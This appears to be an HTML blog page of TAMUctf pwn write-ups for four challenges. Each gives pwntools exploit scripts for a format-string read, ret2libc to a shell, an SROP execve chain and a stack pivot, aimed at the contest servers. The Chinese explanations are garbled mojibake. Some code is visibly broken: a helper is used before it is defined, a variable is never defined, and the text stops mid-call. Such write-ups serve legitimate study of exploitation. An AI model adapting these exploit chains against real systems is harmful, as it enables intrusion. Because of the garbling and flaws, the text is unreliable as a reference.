<h1 id="sniper"><a href="#sniper" class="headerlink" title="sniper"></a>sniper</h1><p>æŒºå¥½ç©çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚å¾ˆæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯è¯»å…¥åœ°å€ä¸º<code>0x0a0a0000</code>, ä¸¤ä¸ªå›è½¦ç¬¦æ˜¾ç„¶æ˜¯é˜²æ­¢æˆ‘ä»¬ç›´æ¥å¾€æ ˆé‡Œè¾“å…¥åœ°å€ã€‚<br>è€ƒæŸ¥ç‚¹æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹äº<code>%s</code>å’Œ<code>%$ns</code>å¤„ç†å…ˆåé¡ºåºä¸åŒï¼ˆå‰å…ˆååï¼‰ï¼Œå…ˆç”¨<code>%c</code>å¡«å……è‡³æ ˆåœ°å€å†ç”¨<code>%hn</code>æ„é€ å‡º<code>0x0a0a</code>æ„é€ å‡ºè¯»å…¥åœ°å€ï¼Œå†åˆ©ç”¨<code>%10$s</code>çš„å¤„ç†é¡ºåºä¸åŒè¯»å‡ºflagå†…å®¹ã€‚</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./sniper/sniper&quot;</span></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_sniper&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) + <span class="number">0x20</span></span><br><span class="line">ls(stack_addr)</span><br><span class="line">addr = <span class="number">0x000000000A0A0000</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">payload = <span class="string">b&quot;%c%c%c%c%c%c%c%c%c%2561c%hn&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;%10$s&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(stack_addr + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload = b&quot;%10$ln%2570c%11$hn&quot;</span></span><br><span class="line"><span class="string">payload += b&quot;%6$p&quot;</span></span><br><span class="line"><span class="string">payload = payload.ljust(32, b&quot;a&quot;)</span></span><br><span class="line"><span class="string">payload += p64(stack_addr)</span></span><br><span class="line"><span class="string">payload += p64(stack_addr + 2)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gigem&#123;you_know_what_maybe_i_should_just_leave_naming_up_to_rng_via_http://ternus.github.io/nsaproductgenerator/&#125;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="debug1"><a href="#debug1" class="headerlink" title="debug1"></a>debug1</h1><p>ç¨‹åºçš„debugåŠŸèƒ½ç›´æ¥æš´éœ²äº†systemåœ°å€ï¼Œä¸”è¿˜åŒ…å«ä¸€ä¸ªå¾ˆé•¿çš„æ ˆæº¢å‡ºã€‚<br>åˆ©ç”¨ç¨‹åºæ­£å¸¸æµç¨‹ä¸­çš„æº¢å‡ºå°†ç¨‹åºæµå¯¼å‘debugå‡½æ•°ï¼Œä¹‹åå°±å‡ºæ¥äº†ã€‚</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./debug-1/debug-1&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./debug-1/libc.so.6&quot;</span></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_debug-1&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Exit\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x58</span> + p64(<span class="number">0x40139F</span> + <span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;well :) )\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;libc leak: &quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000023a5f: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002235f: ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">libc_base = system - libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023A5F</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002235F</span></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x68</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot; characters)!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="rop-thirteen"><a href="#rop-thirteen" class="headerlink" title="rop-thirteen"></a>rop-thirteen</h1><blockquote>
<p>å¯¹ç€æºç åˆ†æå³å¯ï¼Œæˆ‘éƒ½æ²¡ç”¨ida</p>
</blockquote>
<p>go pwnï¼Œç„¶è€Œæ¼æ´å¾ˆæ˜æ˜¾ï¼Œä¸€ä¸ªè²Œä¼¼æ— é™ï¼ˆå®æµ‹æ˜¯æœ‰é™ï¼‰çš„unsafe readå‡½æ•°ï¼š</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="comment">// Using same memory location for feedback to save memory</span></span><br><span class="line">    sliceHeader := (*reflect.SliceHeader)(unsafe.Pointer(&amp;rot13))</span><br><span class="line">    feedbackPointer := <span class="type">uintptr</span>(unsafe.Pointer(&amp;(feedback[<span class="number">0</span>])))</span><br><span class="line">    sliceHeader.Data = feedbackPointer</span><br><span class="line">    _, _ = reader.Read(rot13)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆéšä¾¿å¡«ä¸€äº›æ•°æ®æ‰¾åˆ°æ ˆåœ°å€åç§»(0x110)ï¼Œå†è€ƒè™‘æ„é€ ROPé“¾ã€‚<br>é¢˜ç›®é™æ€é“¾æ¥ï¼Œæ­£å¥½ç»™æˆ‘ä»¬æä¾›äº†å¾ˆå¤šgadget<br>æ„é€ syscall reté“¾ï¼Œå…ˆæ ˆè¿ç§»åˆ°bssæ®µï¼Œé€šè¿‡syscall readæ‰©å¤§æº¢å‡ºç©ºé—´ï¼Œå†SROPä¸€æ­¥åˆ°ä½æ‹¿shellã€‚</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./rop-thirteen/rop-thirteen&quot;</span></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_rop-thirteen&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;abcdefg&quot;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;(up to 360 characters):&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000045f409: syscall; ret;</span></span><br><span class="line"><span class="string">0x000000000045e9f7: mov qword ptr [rdi], rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000465c64: xchg edi, eax; ret;</span></span><br><span class="line"><span class="string">0x000000000045dde7: xchg rdx, rax; ret;</span></span><br><span class="line"><span class="string">0x000000000045f34d: pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000045f81d: mov rsp, rbp; pop rbp; ret;</span></span><br><span class="line"><span class="string">0x000000000041cf18: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x0000000000402481: xor rax, rax; ret;</span></span><br><span class="line"><span class="string">0x00000000004801bd: pop rdx; ret;</span></span><br><span class="line"><span class="string">0x0000000000438d50: pop rsp; ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x51C010</span></span><br><span class="line"></span><br><span class="line">syscall_ret = <span class="number">0x000000000045F409</span></span><br><span class="line">pop_rax = <span class="number">0x000000000040CC26</span></span><br><span class="line">xchg_edi_eax_ret = <span class="number">0x0000000000465C64</span></span><br><span class="line">mov_qword_rdi_rax = <span class="number">0x000000000045E9F7</span></span><br><span class="line">syscall_ret = <span class="number">0x000000000045F409</span></span><br><span class="line">pop_rdx = <span class="number">0x00000000004801BD</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000041CF18</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000045F34D</span></span><br><span class="line">leave_ret = <span class="number">0x000000000045F81D</span></span><br><span class="line">xor_rax = <span class="number">0x0000000000402481</span></span><br><span class="line">pop_rsp = <span class="number">0x0000000000438D50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 68732f6e69622f0a</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">59</span></span><br><span class="line">sigframe.rdi = addr  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">payload = <span class="string">b&quot;k&quot;</span> * <span class="number">0x110</span>  <span class="comment"># + b&quot;b&quot; * 0x8</span></span><br><span class="line">payload += p64(xor_rax)</span><br><span class="line">payload += p64(xchg_edi_eax_ret)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(addr)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x500</span>)</span><br><span class="line">payload += p64(xor_rax)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += p64(pop_rsp)</span><br><span class="line">payload += p64(addr + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += bytes(sigframe)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;feedback here:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">15</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># b *0x484DFB</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="debug-2"><a href="#debug-2" class="headerlink" title="debug-2"></a>debug-2</h1><p>å°±æ˜¯debug-1æŠŠdebugå‡½æ•°åˆ æ‰äº†ï¼Œåªæœ‰ä¸€ä¸ªæ­£å¸¸æµç¨‹ä¸­çš„0x10 bytesçš„æ ˆæº¢å‡º<br>0x10 bytesæ ˆæº¢å‡ºæœ‰å…¬å¼æ‰“æ³•ï¼Œå…ˆæ ˆè¿ç§»åˆ°bssæ®µå†æ‰“ret2libc<br>æ³¨æ„è¿™ä¸ªé¢˜æœ‰ä¸ªå¤§å°å†™è½¬æ¢å¾ˆçƒ¦äººï¼Œpayloadéœ€è¦ç»è¿‡å¤„ç†å†å‘å‡ºå»</p>
<blockquote>
<p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿œç¨‹bssæ®µæ¯”æœ¬åœ°bssæ®µå°‘äº†ä¸¤é¡µçš„ç©ºé—´ï¼Œå¯¼è‡´åœ¨printfçš„æ—¶å€™ä¸€ç›´çˆ†æ ˆï¼Œè¿«ä¸å¾—å·²ç”¨äº†ä¸€æ¬¡csuè·³æ¿è·³è¿‡printfç¯èŠ‚</p>
</blockquote>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./debug-2/debug-2&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./debug-2/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;61.147.171.105&quot;</span>, <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;tamuctf_debug-2&quot;</span>)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0b0100_0001 0x41</span></span><br><span class="line"><span class="comment"># 0b0110_0001 0x61</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0b0010_0000 0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">string</span>):</span><br><span class="line">    res = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) &gt;= i &gt;= <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>)) <span class="keyword">or</span> (<span class="built_in">ord</span>(<span class="string">&quot;z&quot;</span>) &gt;= i &gt;= <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)):</span><br><span class="line">            tmp = i ^ <span class="number">0x20</span></span><br><span class="line">            res += tmp.to_bytes()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += i.to_bytes()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x134a</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Exit\n\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x57</span> + <span class="string">b&quot;|&quot;</span> + <span class="string">b&quot;\xd8&quot;</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;characters):\n\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text_offset = recv(<span class="string">b&quot;\n&quot;</span>) - <span class="number">0x13D8</span></span><br><span class="line">lev_ret = <span class="number">0x00000000000012DA</span> + text_offset</span><br><span class="line">pop_rdi = <span class="number">0x000000000000145B</span> + text_offset</span><br><span class="line">pop_rsi = <span class="number">0x0000000000001459</span> + text_offset</span><br><span class="line">puts_got = text_offset + elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = text_offset + elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">read_got = text_offset + elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x4000</span> + text_offset + <span class="number">0x0E00</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Exit\n\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span> + p64(bss + <span class="number">0x60</span>) + p64(text_offset + <span class="number">0x134A</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;characters):\n\n&quot;</span>, change(payload))</span><br><span class="line"></span><br><span class="line">start = csu_start + text_offset</span><br><span class="line">end = start + <span class="number">0x1A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(bss + 0x80)</span></span><br><span class="line"></span><br><span class="line">payload = p64(end)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">payload += p64(read_got)  <span class="comment"># r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># edi</span></span><br><span class="line">payload += p64(bss + <span class="number">0x88</span>)  <span class="comment"># rsi</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)  <span class="comment"># rdx</span></span><br><span class="line">payload += p64(start)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">payload += p64(text_offset + 0x134A)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(bss + <span class="number">0x8</span>) + p64(lev_ret)</span><br><span class="line">p.sendafter(<span class="string">b&quot;characters):\n\n&quot;</span>, 